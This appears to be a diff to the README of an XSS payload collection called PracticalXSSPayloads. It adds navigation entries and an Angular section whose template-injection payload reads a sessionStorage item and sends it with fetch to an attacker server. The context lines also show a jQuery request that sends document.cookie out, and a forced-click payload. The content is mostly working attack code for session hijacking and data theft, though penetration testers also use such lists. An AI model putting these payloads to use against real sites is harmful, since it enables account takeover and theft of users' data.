@@ -5,9 +5,12 @@ Instead of using alert() for your XSS payloads, I encourage you to check out som
 
 ### **Quick-navigation:**
 + **EXFILTRATION:**  
-  + [Fetch](https://github.com/Insecurities/PracticalXSSPayloads#fetch)  
+  + [FETCH](https://github.com/Insecurities/PracticalXSSPayloads#fetch)  
   + [.$GET](https://github.com/Insecurities/PracticalXSSPayloads#jquery-ajax)
 + **ACTIONS:**
+  + [CLICK](https://github.com/Insecurities/PracticalXSSPayloads#forcing-actions)
++ **ANGULAR NOTE**
+  + [PAYLOADS FOR ANGULAR](https://github.com/Insecurities/PracticalXSSPayloads#angular)
 
 # EXFILTRATION
 *For session hijacking, sensitive info exfil, etc.*
@@ -43,3 +46,11 @@ $.get("https://$ATTACKER_SERVER/?exfil="+document.cookie)
 ```javascript
 document.getElementById("$TARGET_ELEMENT_ID").click()
 ```
+
+# ANGULAR
+For Angular template injection you should be able to use the above payloads in conjunction with constructors. You can find an example below.
+### GET VALUE FROM SESSION STORAGE AND FETCH
+```javascript
+{{constructor.constructor('fetch("https://$ATTACKER_SERVER/?exfil="+sessionStorage.getItem("$ITEM_FROM_LOCAL_STORAGE"))')()}}
+```
+
